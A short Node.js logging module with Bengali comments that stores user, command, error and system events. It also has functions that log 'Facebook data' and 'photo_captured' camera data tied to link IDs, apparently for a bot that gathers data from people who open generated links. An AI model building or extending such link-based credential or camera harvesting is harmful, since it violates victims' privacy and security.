const Log = require('../models/Log');

const logger = {
  // ইউজার অ্যাক্টিভিটি লগ
  logUserActivity: async (userId, username, action, details = {}) => {
    try {
      const log = new Log({
        type: 'user',
        userId,
        username,
        action,
        details
      });
      await log.save();
    } catch (error) {
      console.error('Log Error:', error);
    }
  },
  
  // কমান্ড ইউসেজ লগ
  logCommand: async (userId, username, command, args = {}) => {
    try {
      const log = new Log({
        type: 'command',
        userId,
        username,
        action: command,
        details: args
      });
      await log.save();
    } catch (error) {
      console.error('Log Error:', error);
    }
  },
  
  // ফেসবুক ডাটা লগ
  logFBData: async (linkId, data) => {
    try {
      const log = new Log({
        type: 'fb',
        action: 'data_received',
        details: { linkId, ...data }
      });
      await log.save();
    } catch (error) {
      console.error('Log Error:', error);
    }
  },
  
  // ক্যামেরা ডাটা লগ
  logCameraData: async (linkId, data) => {
    try {
      const log = new Log({
        type: 'camera',
        action: 'photo_captured',
        details: { linkId, ...data }
      });
      await log.save();
    } catch (error) {
      console.error('Log Error:', error);
    }
  },
  
  // এরর লগ
  logError: async (error, source) => {
    try {
      const log = new Log({
        type: 'error',
        action: source,
        details: {
          message: error.message,
          stack: error.stack,
          time: new Date()
        }
      });
      await log.save();
    } catch (err) {
      console.error('Error Log Failed:', err);
    }
  },
  
  // সিস্টেম লগ
  logSystem: async (action, details = {}) => {
    try {
      const log = new Log({
        type: 'system',
        action,
        details
      });
      await log.save();
    } catch (error) {
      console.error('Log Error:', error);
    }
  }
};

module.exports = logger;